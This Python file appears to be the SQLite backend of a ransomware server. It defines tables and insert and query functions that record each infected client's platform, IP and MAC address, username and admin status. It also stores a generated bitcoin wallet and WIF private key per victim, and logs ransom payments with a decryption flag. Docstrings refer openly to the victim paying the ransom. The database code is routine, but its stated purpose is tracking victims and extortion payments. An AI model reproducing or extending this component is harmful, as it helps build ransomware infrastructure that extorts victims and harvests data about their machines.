import sqlite3
import logging

logger = logging.getLogger(__name__)


def create_connection():
    try:
        connection = sqlite3.connect("data.db")
        logger.info("Database connection established successfully")
        return connection
    except Exception as err:
        logger.error(f"Database exception: {err}")
        raise err


def create_tables():
    """This function creates all the tables in the database.

    Raises:
        sqlite3.DatabaseError: Exception raised for errors that are related to the database.
        sqlite3.IntegrityError: Exception raised when the relational integrity of the database is affected, e.g. a foreign key check fails.
        sqlite3.ProgrammingError: Exception raised for programming errors, e.g. table not found or already exists, syntax error in the SQL statement, wrong number of parameters specified, etc.
        sqlite3.OperationalError: Exception raised for errors that are related to the database’s operation.
    """
    logger.info("Creating tables")
    connection = create_connection()
    cursor = connection.cursor()
    statistics_table = """CREATE TABLE IF NOT EXISTS `statistics` (`client_id` VARCHAR(100) NOT NULL,`platform` VARCHAR(75) DEFAULT NULL,`architecture` VARCHAR(75) DEFAULT NULL,`ip_address` VARCHAR(75) DEFAULT NULL,`mac_address` VARCHAR(75) DEFAULT NULL,`device_name` VARCHAR(75) DEFAULT NULL,`username` VARCHAR(75) DEFAULT NULL,`is_admin` BOOLEAN DEFAULT NULL DEFAULT NULL, `created_time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`client_id`));"""
    cursor.execute(statistics_table)
    bitcoin_details = """CREATE TABLE IF NOT EXISTS `bitcoin_details` (`client_id` VARCHAR(100) NOT NULL,`wallet_address` VARCHAR(1000) NOT NULL,`public_key` VARCHAR(1000) NOT NULL,`wif_private_key` VARCHAR(1000) NOT NULL, `created_time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`client_id`,`wallet_address`));"""
    cursor.execute(bitcoin_details)
    payment_details = """CREATE TABLE IF NOT EXISTS `payment_details` (`client_id` VARCHAR(100) NOT NULL,`payee_address` VARCHAR(1000) NOT NULL,`is_decrypted` BOOLEAN NOT NULL, `created_time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`client_id`));"""
    cursor.execute(payment_details)
    connection.commit()
    connection.close()


def insert_statistics_to_database(statistics):
    """Inserts statistics related to the user into the database. It is invoked when a request comes to /initialise

    Args:
        statistics (dict): Dictionary containing various client properties
    
    Raises:
        sqlite3.DatabaseError: Exception raised for errors that are related to the database.
        sqlite3.IntegrityError: Exception raised when the relational integrity of the database is affected, e.g. a foreign key check fails.
        sqlite3.ProgrammingError: Exception raised for programming errors, e.g. table not found or already exists, syntax error in the SQL statement, wrong number of parameters specified, etc.
        sqlite3.OperationalError: Exception raised for errors that are related to the database’s operation.
    """
    try:
        logger.info("Inserting statistics into database")
        connection = create_connection()
        cursor = connection.cursor()
        statistics_insert_query = "INSERT INTO `statistics` (client_id, platform, architecture, ip_address, mac_address, device_name, username, is_admin) VALUES (:client_id, :platform, :architecture, :ip_address, :mac_address, :device_name, :username, :is_admin);"
        cursor.execute(statistics_insert_query, statistics)
        connection.commit()
        connection.close()
    except sqlite3.IntegrityError as err:
        logger.error(f"{err}: Client ID already present")


def insert_bitcoin_details_to_database(
    client_id, wallet_address, wif_encoded_private_key, public_key
):
    """Inserts bitcoin details of each elient into the database. It is invoked when a new bitcoin address is generated.

    Args:
        client_id (str): Unique ID for user in UUID4 format
        wallet_address (str): The wallet address generated for each client
        wif_encoded_private_key (str): Private key of the wallet id in WIF format
        public_key (str): Public key corresponding to the private key
    
    Raises:
        sqlite3.DatabaseError: Exception raised for errors that are related to the database.
        sqlite3.IntegrityError: Exception raised when the relational integrity of the database is affected, e.g. a foreign key check fails.
        sqlite3.ProgrammingError: Exception raised for programming errors, e.g. table not found or already exists, syntax error in the SQL statement, wrong number of parameters specified, etc.
        sqlite3.OperationalError: Exception raised for errors that are related to the database’s operation.
    """
    logger.info("Inserting bitcoin details into database")
    connection = create_connection()
    cursor = connection.cursor()
    bitcoin_details_insert_query = "INSERT INTO `bitcoin_details` (client_id, wallet_address, public_key, wif_private_key) VALUES (?, ?, ?, ?);"
    cursor.execute(
        bitcoin_details_insert_query,
        [client_id, wallet_address, public_key, wif_encoded_private_key],
    )
    connection.commit()
    connection.close()


def get_bitcoin_wallet_id_database(client_id):
    """Get bitcoin wallet address for a given client

    Args:
        client_id (str): Unique ID for user in UUID4 format

    Returns:
        str: The wallet ID for the given client
    
    Raises:
        sqlite3.DatabaseError: Exception raised for errors that are related to the database.
        sqlite3.IntegrityError: Exception raised when the relational integrity of the database is affected, e.g. a foreign key check fails.
        sqlite3.ProgrammingError: Exception raised for programming errors, e.g. table not found or already exists, syntax error in the SQL statement, wrong number of parameters specified, etc.
        sqlite3.OperationalError: Exception raised for errors that are related to the database’s operation.
    """
    logger.info("Getting wallet id from database")
    connection = create_connection()
    cursor = connection.cursor()
    wallet_query = "SELECT wallet_address FROM `bitcoin_details` where client_id = ?;"
    result = cursor.execute(wallet_query, [client_id])
    id = result.fetchone()
    connection.close()
    if id is not None:
        return id[0]


def insert_payment_details_into_database(client_id, payee_wallet_address):
    """Insert details about payment made into the database. It is invoked when the payment verification is successful.

    Args:
        client_id (str): Unique ID for user in UUID4 format
        payee_wallet_address (str): Wallet address from which the victim paid the ransom
    
    Raises:
        sqlite3.DatabaseError: Exception raised for errors that are related to the database.
        sqlite3.IntegrityError: Exception raised when the relational integrity of the database is affected, e.g. a foreign key check fails.
        sqlite3.ProgrammingError: Exception raised for programming errors, e.g. table not found or already exists, syntax error in the SQL statement, wrong number of parameters specified, etc.
        sqlite3.OperationalError: Exception raised for errors that are related to the database’s operation.
    """
    logger.info("Inserting payment details into database")
    connection = create_connection()
    cursor = connection.cursor()
    payment_details_insert_query = "INSERT INTO `payment_details`(client_id, payee_address, is_decrypted) VALUES (?, ?, ?)"
    cursor.execute(
        payment_details_insert_query, [client_id, payee_wallet_address, True]
    )
    connection.commit()
    connection.close()
